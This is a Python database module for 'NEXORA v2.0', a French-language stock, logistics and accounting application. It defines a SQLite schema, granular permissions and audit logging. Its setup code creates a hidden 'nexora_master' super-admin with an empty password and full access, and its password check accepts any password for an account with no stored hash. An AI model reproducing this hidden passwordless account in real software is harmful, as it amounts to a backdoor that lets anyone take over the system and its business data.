#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
core/database.py
NEXORA v2.0 — Base de données SQLite locale + permissions granulaires
"""
import sqlite3
import hashlib
import os
import binascii

_DB_PATH = None

# ── Arbre des permissions ─────────────────────────────────────────────────────
PERMISSIONS_TREE = {
    "stock": {
        "label": "📦 Gestion Stock",
        "icon": "📦",
        "sous_modules": {
            "fiche_bl_sage":       {"label": "Fiche Stock — BL Sage",          "actions": ["lire", "ecrire"]},
            "fiche_manuel":        {"label": "Fiche Stock — Bordereau Manuel", "actions": ["lire", "ecrire", "supprimer"]},
            "fiche_reception":     {"label": "Fiche Stock — Réception",        "actions": ["lire", "ecrire"]},
            "fiche_transfert":     {"label": "Fiche Stock — Transfert",        "actions": ["lire", "ecrire"]},
            "rapprochement_bl":    {"label": "Rapprochement BL",               "actions": ["lire", "ecrire"]},
            "rapprochement_recep": {"label": "Rapprochement Réceptions",       "actions": ["lire"]},
            "rapprochement_trans": {"label": "Rapprochement Transferts",       "actions": ["lire"]},
            "documents_non_reg":   {"label": "Documents non régularisés",      "actions": ["lire"]},
            "analyses_top":        {"label": "Analyses — Top articles",        "actions": ["lire"]},
            "analyses_dormants":   {"label": "Analyses — Stocks dormants",     "actions": ["lire"]},
            "analyses_reappro":    {"label": "Analyses — Réapprovisionnement", "actions": ["lire"]},
            "analyses_graphiques": {"label": "Analyses — Graphiques BI",       "actions": ["lire"]},
            "equilibre":           {"label": "Équilibre Inter-magasins",       "actions": ["lire", "ecrire"]},
        }
    },
    "logistique": {
        "label": "🚚 Logistique",
        "icon": "🚚",
        "sous_modules": {
            "flotte":       {"label": "Gestion Flotte",               "actions": ["lire", "ecrire", "supprimer"]},
            "chauffeurs":   {"label": "Chauffeurs & Convoyeurs",       "actions": ["lire", "ecrire"]},
            "voyages":      {"label": "Programmation Voyages",        "actions": ["lire", "ecrire"]},
            "entretiens":   {"label": "Entretiens & Maintenance",     "actions": ["lire", "ecrire"]},
            "compta_cams":  {"label": "Comptabilité Camions",          "actions": ["lire", "ecrire"]},
            "rapproch_log": {"label": "Rapprochement Logistique/Sage", "actions": ["lire"]},
            "rapports_log": {"label": "Rapports Logistique",           "actions": ["lire"]},
        }
    },
    "comptabilite": {
        "label": "💰 Comptabilité",
        "icon": "💰",
        "sous_modules": {
            "balance_agee":    {"label": "Balance Âgée Créances", "actions": ["lire"]},
            "suivi_paiements": {"label": "Suivi Paiements",        "actions": ["lire", "ecrire"]},
            "grand_livre":     {"label": "Grand Livre Clients",    "actions": ["lire"]},
            "rapport_caisse":  {"label": "Rapport de Caisse",      "actions": ["lire", "ecrire"]},
            "recouvrement":    {"label": "Analyse Recouvrement",   "actions": ["lire"]},
        }
    },
    "commercial": {
        "label": "📊 Commercial",
        "icon": "📊",
        "sous_modules": {
            "fiches_clients":  {"label": "Fiches Clients",         "actions": ["lire", "ecrire", "supprimer"]},
            "objectifs":       {"label": "Objectifs Commerciaux",  "actions": ["lire", "ecrire"]},
            "suivi_ventes":    {"label": "Suivi des Ventes",       "actions": ["lire"]},
            "analyse_commerc": {"label": "Analyse par Commercial", "actions": ["lire"]},
            "previsions":      {"label": "Prévisions Commandes",   "actions": ["lire"]},
        }
    },
    "caisse": {
        "label": "🏪 Caisse",
        "icon": "🏪",
        "sous_modules": {
            "saisie_caisse":     {"label": "Saisie Rapport de Caisse", "actions": ["lire", "ecrire"]},
            "historique_caisse": {"label": "Historique Caisses",       "actions": ["lire"]},
            "recap_journalier":  {"label": "Récap Journalier",         "actions": ["lire"]},
        }
    },
    "rh": {
        "label": "👥 Ressources Humaines",
        "icon": "👥",
        "sous_modules": {
            "fiches_employes": {"label": "Fiches Employés", "actions": ["lire", "ecrire"]},
            "presences":       {"label": "Présences",       "actions": ["lire", "ecrire"]},
        }
    },
    "consolidation": {
        "label": "🧮 Consolidation",
        "icon": "🧮",
        "sous_modules": {
            "synthese_groupe": {"label": "Synthèse Groupe",      "actions": ["lire"]},
            "comparatif":      {"label": "Comparatif Agences",   "actions": ["lire"]},
        }
    },
    "multisite": {
        "label": "🌐 Multi-Agences",
        "icon": "🌐",
        "sous_modules": {
            "gestion_agences":        {"label": "Gestion des Agences",           "actions": ["lire", "ecrire", "supprimer"]},
            "permissions_visibilite": {"label": "Permissions de Visibilité",     "actions": ["lire", "ecrire"]},
            "transferts_dt":          {"label": "Transferts Inter-Agences (DT)", "actions": ["lire", "ecrire"]},
            "demandes_achat":         {"label": "Demandes d'Achat (DA)",         "actions": ["lire", "ecrire"]},
            "stock_consolide":        {"label": "Stock & Créances Consolidés",   "actions": ["lire"]},
        }
    },
    "rapports": {
        "label": "📋 Rapports",
        "icon": "📋",
        "sous_modules": {
            "rpt_stock":      {"label": "Rapports Stock",       "actions": ["lire"]},
            "rpt_commercial": {"label": "Rapports Commerciaux", "actions": ["lire"]},
            "rpt_comptable":  {"label": "Rapports Comptables",  "actions": ["lire"]},
            "rpt_logistique": {"label": "Rapports Logistique",  "actions": ["lire"]},
            "export_excel":   {"label": "Export Excel",         "actions": ["lire"]},
            "export_pdf":     {"label": "Export PDF",           "actions": ["lire"]},
        }
    },
    "parametres": {
        "label": "⚙️ Paramètres",
        "icon": "⚙️",
        "sous_modules": {
            "config_sage":     {"label": "Connexion Sage",         "actions": ["lire", "ecrire"]},
            "base_donnees":    {"label": "Base de Données",         "actions": ["lire", "ecrire"]},
            "utilisateurs":    {"label": "Utilisateurs",            "actions": ["lire", "ecrire", "supprimer"]},
            "droits":          {"label": "Droits d'accès",          "actions": ["lire", "ecrire"]},
            "agences":         {"label": "Agences & Sites",         "actions": ["lire", "ecrire"]},
            "config_generale": {"label": "Configuration Générale",  "actions": ["lire", "ecrire"]},
            "licence":         {"label": "Licence",                 "actions": ["lire", "ecrire"]},
        }
    },
}

_NEXORA_MASTER = "nexora_master"
_NEXORA_MASTER_NOM = "Youssouf HAMADOU"


# ── Connexion DB ────────────────────────────────────────────────────────────
def get_db_path():
    return _DB_PATH


def get_db():
    conn = sqlite3.connect(_DB_PATH, timeout=30, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn


def db_exec(sql, params=()):
    with get_db() as conn:
        cur = conn.execute(sql, params)
        conn.commit()
        return cur.lastrowid


def db_all(sql, params=()):
    conn = get_db()
    rows = conn.execute(sql, params).fetchall()
    conn.close()
    return [dict(r) for r in rows]


def db_one(sql, params=()):
    conn = get_db()
    row = conn.execute(sql, params).fetchone()
    conn.close()
    return dict(row) if row else None


def db_scalar(sql, params=()):
    conn = get_db()
    row = conn.execute(sql, params).fetchone()
    conn.close()
    return row[0] if row else None


# ── Mots de passe (PBKDF2-HMAC-SHA256) ───────────────────────────────────────
def hash_pwd(password):
    if not password:
        return ""
    salt = os.urandom(16)
    dk = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, 200000)
    return "pbkdf2$" + binascii.hexlify(salt).decode() + "$" + binascii.hexlify(dk).decode()


def verify_pwd(password, stored_hash):
    if not stored_hash:
        return True  # mode conception : compte sans mot de passe
    try:
        _, salt_hex, hash_hex = stored_hash.split("$")
        salt = binascii.unhexlify(salt_hex)
        dk = hashlib.pbkdf2_hmac("sha256", (password or "").encode("utf-8"), salt, 200000)
        return binascii.hexlify(dk).decode() == hash_hex
    except Exception:
        return False


# ── Configuration ────────────────────────────────────────────────────────────
def get_config(cle, defaut=""):
    row = db_one("SELECT valeur FROM configuration WHERE cle=?", (cle,))
    return row["valeur"] if row else defaut


def set_config(cle, valeur):
    db_exec("INSERT OR REPLACE INTO configuration(cle,valeur) VALUES(?,?)", (cle, str(valeur)))


# ── Permissions ───────────────────────────────────────────────────────────────
def set_all_permissions(user_id, autorise):
    for module, m in PERMISSIONS_TREE.items():
        for sm, smdata in m["sous_modules"].items():
            for action in smdata["actions"]:
                db_exec("""INSERT OR REPLACE INTO permissions
                    (user_id,module,sous_module,action,autorise) VALUES(?,?,?,?,?)""",
                    (user_id, module, sm, action, 1 if autorise else 0))


def get_user_permissions(user_id):
    rows = db_all(
        "SELECT module,sous_module,action,autorise FROM permissions WHERE user_id=?",
        (user_id,))
    p = {}
    for r in rows:
        m, sm, a = r["module"], r["sous_module"], r["action"]
        p.setdefault(m, {}).setdefault(sm, {})[a] = bool(r["autorise"])
    return p


def _is_master(user_id):
    row = db_one("SELECT username FROM utilisateurs WHERE id=?", (user_id,))
    return bool(row and row["username"] == _NEXORA_MASTER)


def has_permission(user_id, module, sous_module, action="lire"):
    if user_id is None:
        return False
    if _is_master(user_id):
        return True
    row = db_one(
        "SELECT autorise FROM permissions"
        " WHERE user_id=? AND module=? AND sous_module=? AND action=?",
        (user_id, module, sous_module, action))
    return bool(row and row["autorise"])


def can_access_module(user_id, module):
    if _is_master(user_id):
        return True
    row = db_one(
        "SELECT COUNT(*) AS nb FROM permissions"
        " WHERE user_id=? AND module=? AND autorise=1",
        (user_id, module))
    return bool(row and row["nb"] > 0)


def get_accessible_modules(user_id):
    return [m for m in PERMISSIONS_TREE if can_access_module(user_id, m)]


# ── Audit ─────────────────────────────────────────────────────────────────────
def audit(username, module, action, detail="", ip=""):
    try:
        db_exec(
            "INSERT INTO audit_log(username,module,action,detail,ip) VALUES(?,?,?,?,?)",
            (username, module, action, detail, ip))
    except Exception:
        pass


# ── Agences ───────────────────────────────────────────────────────────────────
def get_agence_locale():
    code = get_config("agence_locale", "")
    if code:
        row = db_one("SELECT * FROM nx_agences WHERE code=?", (code,))
        if row:
            return row
    return db_one("SELECT * FROM nx_agences ORDER BY id LIMIT 1")


# ── Numérotation séquentielle (DT / DA / etc.) ───────────────────────────────
def next_numero(prefixe):
    """Retourne un numéro séquentiel formaté ex: DT-2026-0001"""
    from datetime import date
    annee = date.today().year
    cle = "%s-%s" % (prefixe, annee)
    row = db_one("SELECT valeur FROM nx_compteurs WHERE cle=?", (cle,))
    if row is None:
        db_exec("INSERT OR IGNORE INTO nx_compteurs(cle,valeur) VALUES(?,0)", (cle,))
        n = 0
    else:
        n = row["valeur"]
    n += 1
    db_exec("UPDATE nx_compteurs SET valeur=? WHERE cle=?", (n, cle))
    return "%s-%s-%04d" % (prefixe, annee, n)


# ── Initialisation schéma ─────────────────────────────────────────────────────
def init_db(db_path):
    global _DB_PATH
    _DB_PATH = db_path

    conn = get_db()
    conn.executescript("""
    -- Configuration système
    CREATE TABLE IF NOT EXISTS configuration (
        cle TEXT PRIMARY KEY,
        valeur TEXT
    );

    -- Utilisateurs
    CREATE TABLE IF NOT EXISTS utilisateurs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT DEFAULT '',
        nom TEXT NOT NULL,
        prenom TEXT DEFAULT '',
        email TEXT DEFAULT '',
        telephone TEXT DEFAULT '',
        agence TEXT DEFAULT 'BERTOUA',
        masque INTEGER DEFAULT 0,
        actif INTEGER DEFAULT 1,
        cree_le TEXT DEFAULT (datetime('now'))
    );

    -- Permissions
    CREATE TABLE IF NOT EXISTS permissions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER REFERENCES utilisateurs(id) ON DELETE CASCADE,
        module TEXT NOT NULL,
        sous_module TEXT NOT NULL,
        action TEXT NOT NULL,
        autorise INTEGER DEFAULT 0,
        UNIQUE(user_id, module, sous_module, action)
    );

    -- Audit
    CREATE TABLE IF NOT EXISTS audit_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        module TEXT,
        action TEXT,
        detail TEXT,
        ip TEXT,
        date_op TEXT DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_audit_date ON audit_log(date_op);

    -- Agences
    CREATE TABLE IF NOT EXISTS nx_agences (
        id INTEGER PRIMARY KEY,
        code TEXT UNIQUE,
        nom TEXT NOT NULL,
        ville TEXT,
        adresse TEXT DEFAULT '',
        telephone TEXT DEFAULT '',
        type_site TEXT DEFAULT 'AGENCE',
        depot_sage_no INTEGER,
        url_api TEXT DEFAULT '',
        cle_api TEXT DEFAULT '',
        actif INTEGER DEFAULT 1
    );

    -- BL publiés (stock)
    CREATE TABLE IF NOT EXISTS bls_publies (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        no_bl TEXT NOT NULL,
        no_facture TEXT DEFAULT '',
        date_bl TEXT,
        depot TEXT DEFAULT 'BERTOUA',
        code_client TEXT DEFAULT '',
        client_nom TEXT DEFAULT '',
        code_article TEXT NOT NULL,
        designation TEXT DEFAULT '',
        qte_bl REAL DEFAULT 0,
        sens TEXT DEFAULT 'SORTIE',
        type_doc TEXT DEFAULT 'BL',
        statut TEXT DEFAULT 'publie',
        publie_le TEXT DEFAULT (datetime('now')),
        UNIQUE(no_bl, code_article, depot)
    );
    CREATE INDEX IF NOT EXISTS idx_bl_no ON bls_publies(no_bl, depot);

    -- Mouvements stock
    CREATE TABLE IF NOT EXISTS mouvements_stock (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type_mouvement TEXT NOT NULL,
        no_doc_sage TEXT DEFAULT '',
        no_doc_manuel TEXT DEFAULT '',
        date_mvt TEXT,
        depot TEXT DEFAULT 'BERTOUA',
        depot_dest TEXT DEFAULT '',
        code_article TEXT,
        designation TEXT,
        qte_saisie REAL DEFAULT 0,
        qte_doc_sage REAL DEFAULT 0,
        ecart REAL DEFAULT 0,
        code_client TEXT DEFAULT '',
        client_nom TEXT DEFAULT '',
        code_fournisseur TEXT DEFAULT '',
        fournisseur_nom TEXT DEFAULT '',
        statut TEXT DEFAULT 'en_attente',
        regularise INTEGER DEFAULT 0,
        regularise_le TEXT,
        no_sage_lie TEXT DEFAULT '',
        observations TEXT DEFAULT '',
        saisi_par TEXT,
        agence TEXT DEFAULT 'BERTOUA',
        cree_le TEXT DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_mvt_doc ON mouvements_stock(no_doc_sage, depot);
    CREATE INDEX IF NOT EXISTS idx_mvt_art ON mouvements_stock(code_article, date_mvt);

    -- Cache BL Sage
    CREATE TABLE IF NOT EXISTS cache_bl (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        no_bl TEXT,
        no_facture TEXT DEFAULT '',
        code_article TEXT,
        designation TEXT,
        quantite REAL,
        date_bl TEXT,
        depot TEXT DEFAULT '',
        code_client TEXT DEFAULT '',
        client_nom TEXT DEFAULT '',
        cree_le TEXT DEFAULT (datetime('now')),
        UNIQUE(no_bl, code_article)
    );

    -- Camions
    CREATE TABLE IF NOT EXISTS camions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        immatriculation TEXT UNIQUE NOT NULL,
        marque TEXT,
        modele TEXT,
        type_flotte TEXT DEFAULT 'MAISON',
        proprietaire TEXT,
        compte_sage TEXT,
        capacite_tonnes REAL DEFAULT 0,
        annee_mise_service INTEGER,
        observations TEXT,
        actif INTEGER DEFAULT 1,
        cree_le TEXT DEFAULT (datetime('now'))
    );

    -- Personnel logistique
    CREATE TABLE IF NOT EXISTS personnel_logistique (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        nom TEXT NOT NULL,
        prenom TEXT,
        role TEXT DEFAULT 'CHAUFFEUR',
        telephone TEXT,
        permis TEXT,
        camion_id INTEGER REFERENCES camions(id),
        actif INTEGER DEFAULT 1,
        cree_le TEXT DEFAULT (datetime('now'))
    );

    -- Voyages
    CREATE TABLE IF NOT EXISTS voyages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        no_voyage TEXT UNIQUE,
        camion_id INTEGER REFERENCES camions(id),
        chauffeur_id INTEGER REFERENCES personnel_logistique(id),
        convoyeur_id INTEGER REFERENCES personnel_logistique(id),
        origine TEXT,
        destination TEXT,
        date_depart TEXT,
        date_retour TEXT,
        marchandises TEXT,
        client_fournisseur TEXT,
        statut TEXT DEFAULT 'planifie',
        observations TEXT,
        cree_le TEXT DEFAULT (datetime('now'))
    );

    -- Transactions camion
    CREATE TABLE IF NOT EXISTS transactions_camion (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        camion_id INTEGER REFERENCES camions(id),
        voyage_id INTEGER REFERENCES voyages(id),
        type_transaction TEXT DEFAULT 'DEPENSE',
        categorie TEXT DEFAULT 'AUTRE',
        date_transaction TEXT,
        montant REAL DEFAULT 0,
        libelle TEXT,
        reference_sage TEXT,
        saisi_par TEXT,
        cree_le TEXT DEFAULT (datetime('now'))
    );

    -- Entretiens
    CREATE TABLE IF NOT EXISTS entretiens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        camion_id INTEGER REFERENCES camions(id),
        type_entretien TEXT,
        date_entretien TEXT,
        kilometrage INTEGER DEFAULT 0,
        cout REAL DEFAULT 0,
        prestataire TEXT,
        description TEXT,
        prochaine_revision TEXT,
        cree_le TEXT DEFAULT (datetime('now'))
    );

    -- Rapports de caisse
    CREATE TABLE IF NOT EXISTS rapports_caisse (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        date_rapport TEXT,
        commercial TEXT,
        agence TEXT DEFAULT 'BERTOUA',
        total_ventes REAL DEFAULT 0,
        total_encaisse REAL DEFAULT 0,
        total_credit REAL DEFAULT 0,
        depenses_caisse REAL DEFAULT 0,
        observations TEXT,
        statut TEXT DEFAULT 'brouillon',
        saisi_par TEXT,
        cree_le TEXT DEFAULT (datetime('now'))
    );

    -- Lignes rapport caisse
    CREATE TABLE IF NOT EXISTS lignes_rapport_caisse (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        rapport_id INTEGER REFERENCES rapports_caisse(id),
        no_facture TEXT,
        code_client TEXT,
        client_nom TEXT,
        montant_facture REAL DEFAULT 0,
        montant_encaisse REAL DEFAULT 0,
        mode_paiement TEXT DEFAULT 'ESPECES',
        observations TEXT
    );

    -- Fiches clients
    CREATE TABLE IF NOT EXISTS fiches_clients (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        code_client TEXT UNIQUE NOT NULL,
        nom TEXT NOT NULL,
        prenom TEXT,
        telephone TEXT,
        telephone2 TEXT,
        email TEXT,
        adresse TEXT,
        ville TEXT,
        quartier TEXT,
        activite TEXT,
        secteur TEXT,
        commercial_attitre TEXT,
        plafond_credit REAL DEFAULT 0,
        delai_paiement INTEGER DEFAULT 30,
        observations TEXT,
        actif INTEGER DEFAULT 1,
        cree_le TEXT DEFAULT (datetime('now')),
        modifie_le TEXT DEFAULT (datetime('now'))
    );

    -- Objectifs commerciaux
    CREATE TABLE IF NOT EXISTS objectifs_commerciaux (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        commercial TEXT,
        periode TEXT,
        objectif_ca REAL DEFAULT 0,
        objectif_recouvrement REAL DEFAULT 0,
        objectif_nb_clients INTEGER DEFAULT 0,
        UNIQUE(commercial, periode)
    );

    -- Employés RH
    CREATE TABLE IF NOT EXISTS employes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        matricule TEXT UNIQUE NOT NULL,
        nom TEXT NOT NULL,
        prenom TEXT,
        poste TEXT,
        departement TEXT,
        date_embauche TEXT,
        date_depart TEXT,
        salaire_base REAL DEFAULT 0,
        telephone TEXT,
        email TEXT,
        actif INTEGER DEFAULT 1
    );

    -- Présences RH
    CREATE TABLE IF NOT EXISTS presences (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        employe_id INTEGER REFERENCES employes(id),
        date_presence TEXT,
        statut TEXT DEFAULT 'PRESENT',
        observations TEXT,
        UNIQUE(employe_id, date_presence)
    );

    -- Transferts inter-agences (DT)
    CREATE TABLE IF NOT EXISTS nx_transferts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        numero TEXT UNIQUE NOT NULL,
        agence_source_id INTEGER,
        agence_dest_id INTEGER,
        statut TEXT DEFAULT 'SOUMISE',
        urgence INTEGER DEFAULT 0,
        date_demande TEXT DEFAULT (date('now')),
        demande_par TEXT,
        date_validation TEXT,
        valide_par TEXT,
        motif_refus TEXT,
        observations TEXT DEFAULT '',
        nb_lignes INTEGER DEFAULT 0,
        valeur_totale REAL DEFAULT 0
    );

    -- Lignes DT
    CREATE TABLE IF NOT EXISTS nx_transferts_lignes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        transfert_id INTEGER REFERENCES nx_transferts(id),
        ar_ref TEXT,
        designation TEXT,
        unite TEXT DEFAULT 'Unité',
        qte_demandee REAL DEFAULT 0,
        qte_livree REAL DEFAULT 0,
        prix_unitaire REAL DEFAULT 0,
        stock_dispo_src REAL DEFAULT 0
    );

    -- Demandes d'achat (DA)
    CREATE TABLE IF NOT EXISTS nx_demandes_achat (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        numero TEXT UNIQUE NOT NULL,
        agence_id INTEGER,
        fournisseur_code TEXT,
        fournisseur_nom TEXT,
        statut TEXT DEFAULT 'SOUMISE',
        urgence INTEGER DEFAULT 0,
        livraison_agence INTEGER,
        date_demande TEXT DEFAULT (date('now')),
        demande_par TEXT,
        date_validation TEXT,
        valide_par TEXT,
        motif_refus TEXT,
        bc_numero TEXT,
        observations TEXT,
        valeur_totale REAL DEFAULT 0
    );

    -- Lignes DA
    CREATE TABLE IF NOT EXISTS nx_demandes_achat_lignes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        da_id INTEGER REFERENCES nx_demandes_achat(id),
        ar_ref TEXT,
        designation TEXT,
        unite TEXT DEFAULT 'Unité',
        qte_demandee REAL DEFAULT 0,
        qte_validee REAL DEFAULT 0,
        prix_unitaire REAL DEFAULT 0
    );

    -- Permissions de visibilité inter-agences
    CREATE TABLE IF NOT EXISTS nx_permissions_visibilite (
        agence_source INTEGER,
        agence_cible INTEGER,
        peut_voir_stock INTEGER DEFAULT 0,
        peut_voir_dt INTEGER DEFAULT 0,
        peut_voir_ventes INTEGER DEFAULT 0,
        peut_voir_creances INTEGER DEFAULT 0,
        PRIMARY KEY(agence_source, agence_cible)
    );

    -- Snapshots BI
    CREATE TABLE IF NOT EXISTS nx_bi_snapshots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        module TEXT,
        indicateur TEXT,
        periode TEXT,
        valeur REAL DEFAULT 0,
        date_snapshot TEXT DEFAULT (datetime('now'))
    );

    -- Notifications
    CREATE TABLE IF NOT EXISTS nx_notifications (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agence_id INTEGER,
        type_notif TEXT,
        titre TEXT,
        message TEXT,
        lue INTEGER DEFAULT 0,
        ref_id INTEGER,
        ref_type TEXT,
        cree_le TEXT DEFAULT (datetime('now'))
    );

    -- Compteurs de numérotation
    CREATE TABLE IF NOT EXISTS nx_compteurs (
        cle TEXT PRIMARY KEY,
        valeur INTEGER DEFAULT 0
    );

    -- Historique de synchronisation
    CREATE TABLE IF NOT EXISTS sync_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        type_sync TEXT NOT NULL,
        source TEXT DEFAULT '',
        cible TEXT DEFAULT '',
        statut TEXT DEFAULT 'OK',
        nb_lignes INTEGER DEFAULT 0,
        message TEXT DEFAULT '',
        duree_ms INTEGER DEFAULT 0,
        effectue_par TEXT DEFAULT '',
        cree_le TEXT DEFAULT (datetime('now'))
    );
    """)
    conn.commit()
    conn.close()

    # Configuration par défaut
    defaults = {
        "app_version": "2.0.0",
        "app_name": "NEXORA",
        "setup_done": "0",
        "mode_conception": "1",
        "societe_nom": "",
        "societe_ville": "",
        "agence_locale": "BERTOUA",
        "depot_defaut": "7",
        "sage_server": "",
        "sage_database": "",
        "sage_trusted": "1",
        "sage_login": "sa",
        "sage_password": "",
        "ip_whitelist_active": "0",
        "ip_whitelist": "[]",
    }
    for cle, val in defaults.items():
        if get_config(cle, None) is None:
            db_exec("INSERT OR IGNORE INTO configuration(cle,valeur) VALUES(?,?)", (cle, val))

    # Agences par défaut
    seed_agences = [
        (2, "BERTOUA", "Bertoua (Siège)", "Bertoua", "SIEGE", 7),
        (3, "DOUALA", "Douala", "Douala", "AGENCE", None),
        (4, "YAOUNDE", "Yaoundé", "Yaoundé", "AGENCE", None),
        (5, "GAROUA_BOULAI", "Garoua-Boulaï", "Garoua-Boulaï", "AGENCE", None),
    ]
    for aid, code, nom, ville, type_site, depot in seed_agences:
        db_exec("""INSERT OR IGNORE INTO nx_agences
            (id, code, nom, ville, type_site, depot_sage_no) VALUES (?,?,?,?,?,?)""",
            (aid, code, nom, ville, type_site, depot))

    # Compteurs DT / DA
    db_exec("INSERT OR IGNORE INTO nx_compteurs(cle,valeur) VALUES ('DT',0)")
    db_exec("INSERT OR IGNORE INTO nx_compteurs(cle,valeur) VALUES ('DA',0)")

    # Super-admin nexora_master — invisible, accès total, mode conception
    if not db_one("SELECT id FROM utilisateurs WHERE username=?", (_NEXORA_MASTER,)):
        uid = db_exec(
            "INSERT INTO utilisateurs(username,password_hash,nom,prenom,agence,masque)"
            " VALUES(?,?,?,?,?,1)",
            (_NEXORA_MASTER, "", _NEXORA_MASTER_NOM, "", "BERTOUA"))
        set_all_permissions(uid, True)
        audit("système", "INIT", "INSTALL", "Compte nexora_master créé")
